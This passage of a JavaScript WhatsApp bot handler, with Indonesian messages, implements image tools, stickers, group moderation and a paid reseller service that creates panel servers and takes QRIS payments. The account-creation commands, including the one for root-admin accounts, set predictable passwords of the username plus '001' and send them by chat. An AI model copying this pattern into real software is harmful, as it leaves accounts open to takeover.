  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}
let media = await sock.downloadAndSaveMediaMessage(qmsg)
let directLink = await getUrls(fs.readFileSync(media))
try {
const apa = await func.fetchJson(`https://restapi.simplebot.my.id/imagecreator/remini?apikey=${global.ApikeyRestApi}&url=${directLink}`)
await sock.sendMessage(m.chat, {image: {url: apa.result}, caption: "Berhasil ✅"}, {quoted: m})
} catch (err) {
await m.reply("Error: " + err)
}
await fs.unlinkSync(media)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "removebg": case "rbg": {
if (!/image/.test(mime)) return example("dengan kirim/reply foto")
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
async function getUrls (buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}
let media = await sock.downloadAndSaveMediaMessage(qmsg)
let directLink = await getUrls(fs.readFileSync(media))
try {
const apa = await func.fetchJson(`https://restapi.simplebot.my.id/imagecreator/removebg?apikey=${global.ApikeyRestApi}&url=${directLink}`)
await sock.sendMessage(m.chat, {image: {url: apa.result}, caption: "Berhasil ✅"}, {quoted: m})
} catch (err) {
await m.reply("Error: " + err)
}
await fs.unlinkSync(media)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "qc": {
if (!text) return example('teksnya')
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let ppuser
try {
ppuser = await sock.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/gqs7oz.jpg'
}
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
const obj = {
      "type": "quote",
      "format": "png",
      "backgroundColor": reswarna,
      "width": 512,
      "height": 768,
      "scale": 2,
      "messages": [{
         "entities": [],
         "avatar": true,
         "from": {
            "id": 1,
            "name": m.pushName,
            "photo": {
               "url": ppuser
            }
         },
         "text": text,
         "replyMessage": {}
      }]
   }
   try {
   const json = await axios.post('https://bot.lyo.su/quote/generate', obj, {
      headers: {
         'Content-Type': 'application/json'
      }
   })
   const buffer = Buffer.from(json.data.result.image, 'base64')
sock.sendStimg(m.chat, buffer, m, { packname: global.packname })
   } catch (error) {
   m.reply(error.toString())
   }
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ai": case "openai": case "gpt": case "chatgpt": {
if (!text) return example("kamu siapa")
await func.fetchJson(`https://restapi.simplebot.my.id/ai/openai?apikey=${global.ApikeyRestApi}&text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `${e.result}`
sock.sendMessage(m.chat, {text: teks, ai: true}, {quoted: m})
})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return m.reply(msg.group)
if (!isOwner && !m.isAdmin) return m.reply(msg.admin)
if (!m.isBotAdmin) return m.reply(msg.botadmin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await sock.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await sock.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "kick": case "kik": {
if (!isOwner) return m.reply(msg.admin)
if (!m.isGroup) return m.reply(msg.group)
if (!m.isBotAdmin) return m.reply(msg.botadmin)
if (text || m.quoted) {
const input = m.mentionedJid ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await sock.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await sock.groupParticipantsUpdate(m.chat, [input], 'remove')
} else {
return example("@tag/reply")
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "demote":
case "promote": {
if (!isOwner) return m.reply(msg.admin)
if (!m.isGroup) return m.reply(msg.group)
if (!m.isBotAdmin) return m.reply(msg.botadmin)
if (m.quoted || text) {
var action
let target = m.mentionedJid ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await sock.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await sock.sendMessage(m.chat, {text: `Berhasil ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return example("@tag/6285###")
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ht": case "hidetag": {
if (!m.isGroup) return m.reply(msg.group)
if (!isOwner && !m.isAdmin) return m.reply(msg.admin)
if (!text) return example("pesannya")
let member = m.metadata.participants.map(v => v.id)
await sock.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return example("dengan mengirim foto/vidio")
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
var media = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendStimg(m.chat, media, m, {packname: "Whatsapp Bot 2024"})
await fs.unlinkSync(media)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "stickerwm": case "swn": case "wm": {
if (!text) return example("namamu & mengirim foto/vidio")
if (!/image|video/.test(mime)) return example("namamu & mengirim foto/vidio")
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
var media = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendStimg(m.chat, media, m, {packname: text})
await fs.unlinkSync(media)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "brat": {
if (!text) return example("Hello World!")
await sock.sendStimg(m.chat, `https://restapi.simplebot.my.id/imagecreator/brat?apikey=${global.ApikeyRestApi}&text=${text}`, m, {packname: global.namaowner})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "public": {
if (!isOwner) return m.reply(msg.owner)
sock.public = true
m.reply("Berhasil mengganti mode bot menjadi *Public*")
}
break

case "self": {
if (!isOwner) return m.reply(msg.owner)
sock.public = false
m.reply("Berhasil mengganti mode bot menjadi *Self*")
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "get": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply("linknya")
try {
const data = await axios.get(text, { responseType: 'arraybuffer' });
const mime = data.headers['content-type'] || (await FileType.fromBuffer(data.data)).mime
if (/gif|image|video|audio|pdf/i.test(mime)) {
return m.reply(text)
}
var check = await func.fetchJson(text)
return m.reply(JSON.stringify(check, null, 2))
} catch {
return m.reply(`${e}`)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "antilink": {
  if (!isOwner) return m.reply(msg.owner);
  if (!m.isGroup) return m.reply(msg.group);

  let room = antilink.find((i) => i.id == m.chat);

  if (!args[0] || !args[1]) return example("nokick/kick on/off");

  let mode = args[0].toLowerCase();
  let state = args[1].toLowerCase();
  let isOn = /on/g.test(state);
  let isOff = /off/g.test(state);

  if (!["kick", "nokick", "kik", "nokik"].includes(mode))
    return example("nokick/kick on/off");

  if (!isOn && !isOff) return example("nokick/kick on/off");

  let shouldKick = mode === "kick" || mode === "kik";

  if (isOn) {
    if (room && room.kick === shouldKick)
      return m.reply(
        `*Antilink grup ${shouldKick ? "kick" : "no kick"}* di grup ini sudah aktif!`
      );

    if (room) {
      let ind = antilink.indexOf(room);
      antilink.splice(ind, 1);
    }

    antilink.push({ id: m.chat, kick: shouldKick });
    fs.writeFileSync("./data/antilink.json", JSON.stringify(antilink, null, 2));
    return m.reply(
      `*Antilink grup ${shouldKick ? "kick" : "no kick"}* berhasil diaktifkan ✅`
    );
  } else if (isOff) {
    if (!room || room.kick !== shouldKick)
      return m.reply(
        `*Antilink grup ${shouldKick ? "kick" : "no kick"}* di grup ini sudah tidak aktif!`
      );

    let ind = antilink.indexOf(room);
    antilink.splice(ind, 1);
    fs.writeFileSync("./data/antilink.json", JSON.stringify(antilink, null, 2));
    return m.reply(
      `*Antilink grup ${shouldKick ? "kick" : "no kick"}* berhasil dimatikan ✅`
    );
  }
}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "developerbot": case "owner": case "creator": {
await sock.sendContact(m.chat, [global.owner], m)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "backupsc": case "bck": case "backup": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return m.reply("Fitur ini hanya untuk owner pemilik bot!")
let dir = await fs.readdirSync("./server/tmp")
if (dir.length >= 2) {
let res = await dir.filter(e => !e.endsWith(".txt"))
for (let i of res) {
await fs.unlinkSync(`./server/tmp/${i}`)
}}
await m.reply("Processing Backup Script . .")
const tgl = func.getTime().split("T")[0]
let jam = func.getTime().split("T")[1].split("+")[0].split(":")
jam = jam.slice(0, 2).join(":")
const name = `Backup-${tgl}#${jam}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await sock.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
    if (!isOwner && !isGrupReseller) {
        return m.reply(`Fitur ini hanya untuk dalam grup *reseller panel*!\nJoin grup *reseller panel* langsung chat ${global.owner}`);
    }
    if (!text) return example("username,628XXX");

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return example("username,628XXX");
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await sock.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di WhatsApp!");
    } catch (err) {
        return m.reply("Terjadi kesalahan saat mengecek nomor WhatsApp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = func.capital(username) + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return m.reply("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;

        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
                description: func.tanggal(Date.now()),
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return m.reply("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (m.isGroup) {
        await m.reply(`Berhasil membuat akun panel ✅\ndata akun sudah di kirim ke ${nomor == m.sender ? "private chat" : nomor.split("@")[0]}`)
        }        
        if (nomor !== m.sender && !m.isGroup) {
        await m.reply(`Berhasil membuat akun panel ✅\ndata akun sudah di kirim ke ${nomor.split("@")[0]}`)
        }
        
        let teks = `
*Berikut Detail Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ ${func.tanggal(Date.now())}*

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}*
* Disk : *${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu + "%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`;

        await sock.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return m.reply("Terjadi kesalahan: " + err.message);
    }
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listpanel": case "listp": case "listserver": {
if (!isOwner && !isGrupReseller) return m.reply(`Fitur ini hanya untuk dalam grup *reseller panel*!\nJoin grup *reseller panel* langsung chat ${global.owner}`)
let f = await fetch(domain + "/api/application/servers", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak ada server panel!")
let messageText = ""
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n 📡 *${s.id} [ ${s.name} ]*
 *• Ram :* ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}
 *• CPU :* ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}
 *• Disk :* ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}
 *• Created :* ${s.created_at.split("T")[0]}\n`
}
await sock.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "delpanel": {
if (!isOwner && !isGrupReseller) return m.reply(`Fitur ini hanya untuk dalam grup *reseller panel*!\nJoin grup *reseller panel* langsung chat ${global.owner}`)
if (!text) return example("idnya")
let f = await fetch(domain + "/api/application/servers", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Gagal menghapus server!\nID server tidak ditemukan")
await m.reply(`Sukses menghapus server panel *${func.capital(nameSrv)}*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "cadmin": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("username,628XXX")
let nomor
let usernem
let tek = text.split(",")
if (tek.length > 1) {
let [users, nom] = text.split(",")
if (!users || !nom) return example("username,628XXX")
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = text.toLowerCase()
nomor = m.isGroup ? m.sender : m.chat
}
var onWa = await sock.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
let username = usernem.toLowerCase()
let email = username+"@gmail.com"
let name = func.capital(args[0])
let password = username+"001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang = nomor
if (m.isGroup) {
await m.reply(`Berhasil membuat akun admin panel ✅\ndata akun sudah di kirim ke ${nomor == m.sender ? "private chat" : nomor.split("@")[0]}`)
}        
if (nomor !== m.sender && !m.isGroup) {
await m.reply(`Berhasil membuat akun admin panel ✅\ndata akun sudah di kirim ke ${nomor.split("@")[0]}`)
}
var teks = `
*Berikut Detail Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ ${func.tanggal(Date.now())}*

*🌐* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await sock.sendMessage(orang, {text: teks}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listadmin": {
if (!isOwner) return m.reply(msg.owner)
let cek = await fetch(domain + "/api/application/users", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = ""
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n 📡 *${i.attributes.id} [ ${i.attributes.first_name} ]*
 *• Nama :* ${i.attributes.first_name}
 *• Created :* ${i.attributes.created_at.split("T")[0]}\n`
})
await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "deladmin": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("idnya")
let cek = await fetch(domain + "/api/application/users", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Gagal menghapus akun!\nID user tidak ditemukan")
await m.reply(`Sukses menghapus akun admin panel *${func.capital(getid)}*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "clearserver": {
if (!isOwner) return m.reply(msg.owner)
await m.reply(`Memproses penghapusan semua user & server panel yang bukan admin`)
try {
const PTERO_URL = global.domain
// Ganti dengan URL panel Pterodactyl
const API_KEY = global.apikey// API Key dengan akses admin

// Konfigurasi headers
const headers = {
  "Authorization": "Bearer " + API_KEY,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

// Fungsi untuk mendapatkan semua user
async function getUsers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    
    return [];
  }
}

// Fungsi untuk mendapatkan semua server
async function getServers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

// Fungsi untuk menghapus server berdasarkan UUID
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}

// Fungsi untuk menghapus user berdasarkan ID
async function deleteUser(userID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}

// Fungsi utama untuk menghapus semua user & server yang bukan admin
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0

  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }

    const userID = user.attributes.id;
    const userEmail = user.attributes.email;

    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);

    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);

    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }

    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await m.reply(`Berhasil menghapus ${totalSrv} user & server panel yang bukan admin.`)
}

// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return m.reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("cmd|responnya")
if (!text.split("|")) return example("cmd|responnya")
let result = text.split("|")
if (result.length < 2) return example("cmd|responnya")
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./data/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return ("cmd\n\n ketik *.listrespon* untuk melihat semua cmd")
const cmd = text.toLowerCase()
if (cmd == "all") {
list.splice(0, list.length)
await fs.writeFileSync("./data/list.json", JSON.stringify(list, null, 2))
return m.reply("Berhasil menghapus semua respon ✅")
}
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./data/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isOwner) return m.reply(msg.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = ""
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "batalbeli": {
if (m.isGroup) return
if (!sock[m.sender]) return 
await sock.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: sock[m.sender].msg})
await sock.sendMessage(m.chat, { delete: sock[m.sender].msg.key })
await clearTimeout(sock[m.sender].exp)
delete sock[m.sender];
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //


case "buysaldo": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Saldo hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text || !args[0]) return example("nomor/id")
  if (!text.includes("|")) {
    let nodana = text.trim()
    const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /DOMPET DIGITAL/i.test(item.kategori) && item.harga > 0)
        let sections = await dana.map((item) => {
            return {
                title: `${item.keterangan}`,
                header: `${item.produk} ✅`, 
                description: `Rp${item.harga}`, 
                id: `.buysaldo ${nodana}|${item.kode}|${item.harga}|${item.keterangan}`
            };
})
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Ewallet",
                sections: [
                  {
                    rows: sections, 
                  },
                ],
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Jumlah & Ewallet 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: null }
    );
  }

  let Obj = {};
  Obj.harga = text.split("|")[2]
  Obj.nominal = text.split("|")[3]
  Obj.kode = text.split("|")[1]
  Obj.nodana = text.split("|")[0]
  
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250)

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Nomor Tujuan :* ${Obj.nodana}
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

